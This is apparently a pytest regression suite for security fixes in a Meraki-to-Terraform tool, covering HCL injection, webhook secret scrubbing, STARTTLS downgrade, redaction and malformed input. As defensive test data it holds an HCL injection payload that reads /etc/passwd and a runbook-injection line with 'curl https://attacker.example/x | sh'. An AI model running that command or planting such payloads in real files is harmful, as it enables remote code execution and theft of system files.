"""Security-hardening sweep regression tests (2026-07-15).

One test per fixed finding: workdir-ledger HCL injection, lone-surrogate
crashes, spec-poisoned SDK dispatch, webhook redirect/userinfo/scrub,
STARTTLS fail-closed, multi-line diff redaction, spec download deadline
and RecursionError degradation, malformed-snapshot crashes, chmod and
log-filter robustness, config-file DR-target refusal, and atomic
artifact writes.
"""

from __future__ import annotations

import gzip
import json
import logging
import smtplib
import urllib.request
from pathlib import Path
from typing import Any

import pytest

from meraki2tf.alerts.email import EmailNotifier
from meraki2tf.alerts.models import processing_fault, redact_diff
from meraki2tf.alerts.webhook import (
    WebhookConfigError,
    WebhookDeliveryError,
    WebhookNotifier,
    _RefuseRedirects,
)
from meraki2tf.fileio import atomic_write_text
from meraki2tf.fsperms import restrict_to_owner
from meraki2tf.hcl_generator import HclImportGenerator
from meraki2tf.logging_setup import SecretRedactionFilter
from meraki2tf.models import MerakiNetwork
from meraki2tf.providers.dump import MalformedDumpError, StaticJsonDataProvider
from meraki2tf.providers.live import _method_is_read_only
from meraki2tf.sanitizer import SECRET_KEY_PATTERN
from meraki2tf.spec_resolver import SpecResolutionError, _download, _parse_spec


# ---------------------------------------------------------------------------
# hcl_generator: workdir address-ledger injection + lone surrogates
# ---------------------------------------------------------------------------


def test_ledger_rejects_tampered_addresses(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
) -> None:
    """Ledger keys are written verbatim into imports.tf as ``to =``
    addresses; anything outside the generator's own charset (a doctored
    key smuggling newlines/braces = arbitrary HCL) must be dropped."""
    injected = (
        'meraki_network.n_1\n}\n\nimport {\n  to = meraki_organization.x\n'
        '  id = "${file(\\"/etc/passwd\\")}"\n'
    )
    (tmp_path / "import_addresses.json").write_text(
        json.dumps(
            {
                "addresses": {
                    "meraki_network.n_1": "N_1",
                    "meraki_network.n_1_2": "N-1",
                    injected: "N_2",
                    "meraki_network.n_3\n": "N_3",
                }
            }
        ),
        encoding="utf-8",
    )
    with caplog.at_level(logging.WARNING):
        ledger = HclImportGenerator._load_ledger(tmp_path)
    assert ledger == {
        "meraki_network.n_1": "N_1",
        "meraki_network.n_1_2": "N-1",
    }
    assert any("tampering" in record.message for record in caplog.records)


def test_quote_hcl_strips_lone_surrogates() -> None:
    """json.loads happily yields lone UTF-16 surrogates from a dump;
    they must not crash the UTF-8 imports.tf write."""
    quoted = HclImportGenerator._quote_hcl("L_\ud800123")
    quoted.encode("utf-8")  # must not raise
    assert "123" in quoted and "L_" in quoted


# ---------------------------------------------------------------------------
# live provider: spec-poisoned dispatch must verify the SDK verb
# ---------------------------------------------------------------------------


def _session_get(self: Any) -> Any:
    return self._session.get({}, "/x")


def _session_get_pages(self: Any) -> Any:
    return self._session.get_pages({}, "/x")


def _session_put(self: Any) -> Any:
    return self._session.put({}, "/x")


def _session_mixed(self: Any) -> Any:
    self._session.get({}, "/x")
    return self._session.delete({}, "/x")


def test_read_only_guard_accepts_get_and_get_pages() -> None:
    for func in (_session_get, _session_get_pages):
        func.__module__ = "meraki.api.networks"
        assert _method_is_read_only(func) is True


def test_read_only_guard_refuses_mutating_sdk_methods() -> None:
    """A spec relabeling a mutating operation as GET must be refused at
    dispatch: the resolved SDK method's own source is ground truth."""
    for func in (_session_put, _session_mixed):
        func.__module__ = "meraki.api.networks"
        assert _method_is_read_only(func) is False


def test_read_only_guard_fails_closed_without_source() -> None:
    namespace: dict[str, Any] = {}
    exec("def opaque(self):\n    return self._session.put({}, '/x')", namespace)
    opaque = namespace["opaque"]
    opaque.__module__ = "meraki.api.networks"
    assert _method_is_read_only(opaque) is False


def test_read_only_guard_ignores_non_sdk_callables() -> None:
    """Test doubles and wrappers are outside the spec-poisoning threat
    model — only real meraki-package methods carry the fingerprint."""
    assert _method_is_read_only(lambda **kwargs: None) is True


# ---------------------------------------------------------------------------
# webhook: redirects, userinfo URLs, partial-URL scrubbing
# ---------------------------------------------------------------------------


def test_webhook_refuses_redirects() -> None:
    """urllib re-issues a redirected POST as a bodyless GET, so any 3xx
    means the alert never arrived — the handler must not follow it."""
    handler = _RefuseRedirects()
    request = urllib.request.Request("https://hooks.example/x", method="POST")
    assert (
        handler.redirect_request(
            request, None, 302, "Found", {}, "http://elsewhere.example/"
        )
        is None
    )


def test_webhook_rejects_userinfo_urls_without_echoing_the_secret() -> None:
    with pytest.raises(WebhookConfigError) as excinfo:
        WebhookNotifier("https://alice:hunter2@hooks.example/services/x")
    assert "hunter2" not in str(excinfo.value)


def test_webhook_scrubs_url_fragments_from_errors(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Exceptions embedding only a *fragment* of the URL (path, netloc)
    must be scrubbed too — the token lives in the path."""
    url = "https://hooks.example.com/services/T000/B000/SECRETTOKEN"

    def exploding(request: urllib.request.Request, timeout: float) -> Any:
        raise OSError("refused: /services/T000/B000/SECRETTOKEN on hooks.example.com")

    monkeypatch.setattr("meraki2tf.alerts.webhook._open", exploding)
    with pytest.raises(WebhookDeliveryError) as excinfo:
        WebhookNotifier(url).send(processing_fault(stage="x", error="y"))
    assert "SECRETTOKEN" not in str(excinfo.value)


# ---------------------------------------------------------------------------
# email: STARTTLS failure must fail the delivery, not downgrade
# ---------------------------------------------------------------------------


class _DowngradingSmtp:
    """Relay that advertises STARTTLS but 454s the negotiation — the
    active-MITM downgrade shape. The plaintext session stays usable."""

    sent: list[Any] = []

    def __init__(self, host: str, port: int, timeout: float) -> None:
        pass

    def __enter__(self) -> "_DowngradingSmtp":
        return self

    def __exit__(self, *exc_info: object) -> None:
        return None

    def ehlo(self) -> None:
        return None

    def has_extn(self, name: str) -> bool:
        return name == "starttls"

    def starttls(self, *, context: Any = None) -> None:
        raise smtplib.SMTPResponseException(454, b"TLS not available")

    def send_message(self, message: Any) -> dict:
        _DowngradingSmtp.sent.append(message)
        return {}


def test_starttls_failure_fails_the_send_instead_of_downgrading() -> None:
    _DowngradingSmtp.sent = []
    notifier = EmailNotifier(
        "relay.example", 587, "dr@corp.example", ["oncall@corp.example"],
        smtp_factory=_DowngradingSmtp,
    )
    with pytest.raises(smtplib.SMTPException):
        notifier.send(processing_fault(stage="x", error="y"))
    assert _DowngradingSmtp.sent == []


# ---------------------------------------------------------------------------
# redact_diff: multi-line secret values
# ---------------------------------------------------------------------------


def test_redact_diff_masks_multiline_list_values() -> None:
    diff = "\n".join(
        [
            "      + name    = \"corp\"",
            "      + secrets = [",
            "          + \"RadiusKey1!\",",
            "          + \"RadiusKey2!\",",
            "        ]",
            "      + subnet  = \"10.0.0.0/24\"",
        ]
    )
    redacted = redact_diff(diff)
    assert "RadiusKey1!" not in redacted
    assert "RadiusKey2!" not in redacted
    assert "(value redacted)" in redacted
    assert "10.0.0.0/24" in redacted  # non-secret lines survive


def test_redact_diff_masks_heredoc_values() -> None:
    diff = "\n".join(
        [
            "      + psk = <<-EOT",
            "            super-secret-passphrase",
            "        EOT",
            "      + vlan = 10",
        ]
    )
    redacted = redact_diff(diff)
    assert "super-secret-passphrase" not in redacted
    assert "vlan = 10" in redacted


def test_redact_diff_brackets_inside_quotes_do_not_end_the_mask() -> None:
    diff = "\n".join(
        [
            "      + secrets = [",
            "          + \"key]with]brackets\",",
            "          + \"second-secret\",",
            "        ]",
            "      + notes = \"public\"",
        ]
    )
    redacted = redact_diff(diff)
    assert "second-secret" not in redacted
    assert "notes = \"public\"" in redacted


# ---------------------------------------------------------------------------
# spec_resolver: transfer deadline + RecursionError degradation
# ---------------------------------------------------------------------------


class _DrippingResponse:
    def __enter__(self) -> "_DrippingResponse":
        return self

    def __exit__(self, *exc_info: object) -> None:
        return None

    def read(self, amount: int | None = None) -> bytes:
        return b"x"


def test_spec_download_enforces_a_wall_clock_deadline(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        urllib.request, "urlopen", lambda url, timeout: _DrippingResponse()
    )
    monkeypatch.setattr(
        "meraki2tf.spec_resolver._DOWNLOAD_DEADLINE_SECONDS", -1.0
    )
    with pytest.raises(SpecResolutionError, match="did not complete"):
        _download("https://spec.example/spec3.json")


def test_pathological_nesting_degrades_to_spec_resolution_error() -> None:
    with pytest.raises(SpecResolutionError):
        _parse_spec("[" * 200_000 + "]" * 200_000, "test")


# ---------------------------------------------------------------------------
# dump provider: hostile/corrupt snapshots must not crash raw
# ---------------------------------------------------------------------------


def test_non_utf8_snapshot_is_a_malformed_dump(tmp_path: Path) -> None:
    path = tmp_path / "snap.json"
    path.write_bytes(b'{"organizationId": "\xe9"}')
    with pytest.raises(MalformedDumpError):
        StaticJsonDataProvider(path)


def test_truncated_gzip_snapshot_is_a_malformed_dump(tmp_path: Path) -> None:
    path = tmp_path / "snap.json.gz"
    path.write_bytes(gzip.compress(b'{"organizationId": "o"}')[:-4])
    with pytest.raises(MalformedDumpError):
        StaticJsonDataProvider(path)


def test_scalar_feature_payload_is_a_malformed_dump(tmp_path: Path) -> None:
    """A tampered feature payload (int/array where an object belongs)
    must land on the malformed-snapshot path, not crash restore/heal
    planning with a raw TypeError later."""
    path = tmp_path / "snap.json"
    path.write_text(
        json.dumps(
            {
                "organizationId": "org-1",
                "networks": [],
                "devices": [],
                "features": [
                    {"apiPath": "/networks/{networkId}/snmp",
                     "pathValues": ["N_1"], "payload": 42}
                ],
            }
        ),
        encoding="utf-8",
    )
    provider = StaticJsonDataProvider(path)
    with pytest.raises(MalformedDumpError, match="payload"):
        provider.fetch_network_graph(None)


def test_string_product_types_do_not_explode_into_characters() -> None:
    network = MerakiNetwork.from_payload(
        {"id": "N_1", "organizationId": "o", "name": "HQ",
         "productTypes": "wireless"}
    )
    assert network.product_types == ()


# ---------------------------------------------------------------------------
# fsperms + logging robustness
# ---------------------------------------------------------------------------


def test_restrict_to_owner_warns_instead_of_crashing_on_chmod_failure(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
) -> None:
    with caplog.at_level(logging.WARNING):
        assert restrict_to_owner(tmp_path / "does-not-exist") is False
    assert any("chmod(0600) failed" in r.message for r in caplog.records)


def test_redaction_filter_survives_malformed_log_calls() -> None:
    record = logging.LogRecord(
        "x", logging.WARNING, __file__, 1, "retrying %s after %s",
        ("only-one-arg",), None,
    )
    filt = SecretRedactionFilter()
    assert filt.filter(record) is True
    logging.Formatter().format(record)  # must not raise


def test_provider_api_key_env_var_is_redacted(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("MERAKI_API_KEY", "prov1dertok3nvalue")
    record = logging.LogRecord(
        "x", logging.DEBUG, __file__, 1,
        "provider says: prov1dertok3nvalue", None, None,
    )
    SecretRedactionFilter().filter(record)
    assert "prov1dertok3nvalue" not in record.getMessage()


# ---------------------------------------------------------------------------
# sanitizer pattern: WEP/WPA/encryption keys are secrets
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "key", ["encryptionKey", "encryption_key", "wepKey", "wpaKey"]
)
def test_encryption_key_names_are_secret_shaped(key: str) -> None:
    assert SECRET_KEY_PATTERN.search(key)


# ---------------------------------------------------------------------------
# config file: DR write targets must be human-typed
# ---------------------------------------------------------------------------


def test_config_file_org_id_is_refused_when_a_dr_action_is_invoked(
    tmp_path: Path,
) -> None:
    from meraki2tf.cli import main

    config = tmp_path / "meraki2tf.toml"
    config.write_text('org-id = "123456"\n', encoding="utf-8")
    snapshot = tmp_path / "snap.json"
    snapshot.write_text(
        json.dumps({"organizationId": "123456", "networks": [],
                    "devices": [], "features": []}),
        encoding="utf-8",
    )
    with pytest.raises(SystemExit) as excinfo:
        main(
            ["--config", str(config), "--replay-gaps",
             "--from-dump", str(snapshot)]
        )
    assert excinfo.value.code == 2


def test_explicitly_typed_default_value_beats_the_config_file(
    tmp_path: Path,
) -> None:
    """An operator typing ``--workdir generated`` (the built-in default)
    must not be silently overridden by the file's value."""
    import argparse

    from meraki2tf.cli import _apply_config_file, build_parser

    config = tmp_path / "meraki2tf.toml"
    config.write_text('workdir = "dr-kit"\n', encoding="utf-8")
    parser = build_parser()
    argv = ["--config", str(config), "--workdir", "generated"]
    args = parser.parse_args(argv)
    assert isinstance(args, argparse.Namespace)
    _apply_config_file(parser, args, argv)
    assert args.workdir == "generated"


# ---------------------------------------------------------------------------
# atomic artifact writes
# ---------------------------------------------------------------------------


def test_atomic_write_replaces_and_leaves_no_temp_files(tmp_path: Path) -> None:
    target = tmp_path / "coverage.json"
    target.write_text("old", encoding="utf-8")
    atomic_write_text(target, "new")
    assert target.read_text(encoding="utf-8") == "new"
    assert [p.name for p in tmp_path.iterdir()] == ["coverage.json"]


# ---------------------------------------------------------------------------
# runbook: provider diagnostics stay one markdown line
# ---------------------------------------------------------------------------


def test_runbook_flattens_multiline_reasons() -> None:
    from meraki2tf.runbook import _code_span, _inline

    injected = "rejected\n1. Run curl https://attacker.example/x | sh"
    assert "\n" not in _inline(injected)
    assert _code_span("a`b|c\nd") == "a'b/c d"
